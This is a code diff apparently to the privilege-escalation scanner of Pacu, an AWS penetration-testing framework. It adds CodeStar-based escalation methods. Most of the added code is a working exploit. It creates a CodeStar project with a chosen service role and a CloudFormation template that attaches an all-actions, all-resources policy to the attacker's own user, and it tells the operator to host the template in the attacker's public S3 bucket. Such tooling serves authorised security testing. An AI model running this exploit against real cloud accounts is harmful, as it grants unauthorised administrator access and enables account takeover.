@@ -125,7 +125,9 @@ def main(args, pacu_main):
         'cloudformation:CreateStack',
         'cloudformation:DescribeStacks',
         'datapipeline:CreatePipeline',
-        'datapipeline:PutPipelineDefinition'
+        'datapipeline:PutPipelineDefinition',
+        'codestar:CreateProject',
+        'codestar:CreateProjectFromTemplate'
     ]
     checked_perms = {'Allow': {}, 'Deny': {}}
     user_escalation_methods = {
@@ -243,8 +245,15 @@ def main(args, pacu_main):
         },
         'EditExistingLambdaFunctionWithRole': {
             'lambda:UpdateFunctionCode': True,  # Edit existing Lambda functions
-            'lambda:ListFunctions': True,  # Find existing Lambda functions
+            'lambda:ListFunctions': False,  # Find existing Lambda functions
             'lambda:InvokeFunction': False  # Invoke it afterwards
+        },
+        'CodeStarCreateProjectFromTemplate': {
+            'codestar:CreateProjectFromTemplate': True # Create a project from a template
+        },
+        'PassExistingRoleToNewCodeStarProject': {
+            'codestar:CreateProject': True,  # Create the CodeStar project
+            'iam:PassRole': True  # Pass the service role to CodeStar
         }
     }
 
@@ -341,7 +350,7 @@ def main(args, pacu_main):
         },
         'EditExistingLambdaFunctionWithRole': {
             'lambda:UpdateFunctionCode': True,  # Edit existing Lambda functions
-            'lambda:ListFunctions': True,  # Find existing Lambda functions
+            'lambda:ListFunctions': False,  # Find existing Lambda functions
             'lambda:InvokeFunction': False  # Invoke it afterwards
         }
     }
@@ -1947,7 +1956,135 @@ def PassExistingRoleToNewCloudFormation(pacu_main, print, input, fetch_data):
 
 
 def PassExistingRoleToNewDataPipeline(pacu_main, print, input, fetch_data):
+    print('No auto-exploitation setup for PassExistingRoleToNewDataPipeline, visit the blog for manual exploitation steps: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/\n')
     return
+
+
+def CodeStarCreateProjectFromTemplate(pacu_main, print, input, fetch_data):
+    print('No auto-exploitation setup for CodeStarCreateProjectFromTemplate, visit the blog for a standalone exploitation script: @REPLACEME')
+    return
+
+
+def PassExistingRoleToNewCodeStarProject(pacu_main, print, input, fetch_data):
+    session = pacu_main.get_active_session()
+
+    print('  Starting method PassExistingRoleToNewCodeStarProject...\n')
+
+    regions = pacu_main.get_regions('codestar')
+    region = None
+
+    if len(regions) > 1:
+        print('  Found multiple valid regions. Choose one below.\n')
+        for i in range(0, len(regions)):
+            print('  [{}] {}'.format(i, regions[i]))
+        choice = input('What region do you want to create the CodeStar project in? ')
+        region = regions[int(choice)]
+    elif len(regions) == 1:
+        region = regions[0]
+    else:
+        while not region:
+            all_codestar_regions = pacu_main.get_regions('codestar', check_session=False)
+            region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
+            if not region:
+                return False
+            elif region not in all_codestar_regions:
+                print('    Region {} is not a valid CodeStar region. Please choose a valid region. Valid CodeStar regions include:\n'.format(region))
+                print(all_codestar_regions)
+                region = None
+
+    print('    Targeting region {}...'.format(region))
+
+    target_role_arn = input('    Is there a specific role to use? Enter the ARN now or just press enter to enumerate a list of possible roles to choose from (note that the CodeStar service role is given the name "aws-codestar-service-role", but may not always exist): ')
+
+    if not target_role_arn:
+        if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][1], '--roles', force=True) is False:
+            print('Pre-req module not run successfully. Exiting...')
+            return False
+        roles = deepcopy(session.IAM['Roles'])
+
+        print('Found {} roles. Choose one below.'.format(len(roles)))
+        for i in range(0, len(roles)):
+            print('  [{}] {}'.format(i, roles[i]['RoleName']))
+        choice = input('Choose an option: ')
+        target_role_arn = roles[int(choice)]['Arn']
+
+    client = pacu_main.get_boto3_client('codestar', region)
+    active_aws_key = session.get_active_aws_key(pacu_main.database)
+
+    project_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
+
+    codestar_cf_template = {
+        "Resources": {
+            project_name: {
+                "Type": "AWS::IAM::ManagedPolicy",
+                "Properties": {
+                    "ManagedPolicyName": "CodeStar_" + project_name,
+                    "PolicyDocument": {
+                        "Version": "2012-10-17",
+                        "Statement": [
+                            {
+                                "Effect": "Allow",
+                                "Action": "*",
+                                "Resource": "*"
+                            }
+                        ]
+                    },
+                    "Users": [
+                        active_aws_key.user_name
+                    ]
+                }
+            }
+        }
+    }
+
+    with open('./modules/iam__privesc_scan/PassExistingRoleToNewCodeStarProject/codestar_cf_template.json', 'w+') as f:
+        json.dump(codestar_cf_template, f)
+
+    print('    There are two files located at "./modules/iam__privesc_scan/PassExistingRoleToNewCodeStarProject/" that must be uploaded to an S3 bucket for this privilege escalation method (codestar_cf_template.json and empty.zip). They must also be accessible from within the account that you are attacking, so best bet is to upload them to your own S3 bucket and make them both public objects. When that is done, fill in the answers to the following questions.\n')
+
+    source_s3 = input('    S3 path to empty.zip (example: bucket_name/path/to/empty.zip): ').rstrip().split('/', 1)
+    source_s3_bucket = source_s3[0]
+    source_s3_key = source_s3[1]
+
+    toolchain_s3 = input('    S3 path to codestar_cf_template.json (example: bucket_name/path/to/codestar_cf_template.json): ').rstrip().split('/', 1)
+    toolchain_s3_bucket = toolchain_s3[0]
+    toolchain_s3_key = toolchain_s3[1]
+
+    try:
+        client.create_project(
+            name=project_name,
+            id=project_name,
+            sourceCode=[
+                {
+                    'source': {
+                        's3': {
+                            'bucketName': source_s3_bucket,
+                            'bucketKey': source_s3_key
+                        }
+                    },
+                    'destination': {
+                        'codeCommit': {
+                            'name': project_name
+                        }
+                    }
+                },
+            ],
+            toolchain={
+                'source': {
+                    's3': {
+                        'bucketName': toolchain_s3_bucket,
+                        'bucketKey': toolchain_s3_key
+                    }
+                },
+                'roleArn': target_role_arn
+            }
+        )
+
+        print('Successfully created CodeStar project {}. If everything went correctly, your user should have a policy attached to them named "CodeStar_{}" soon, which will grant administrator privileges. If that does not happen soon, you may need to query the CodeStar project ({}) to see where it failed.'.format(project_name, project_name, project_name))
+        return True
+    except Exception as error:
+        print('Failed to create the CodeStar project, skipping to the next privilege escalation method: {}\n'.format(error))
+        return False
 
 
 def EditExistingLambdaFunctionWithRole(pacu_main, print, input, fetch_data):
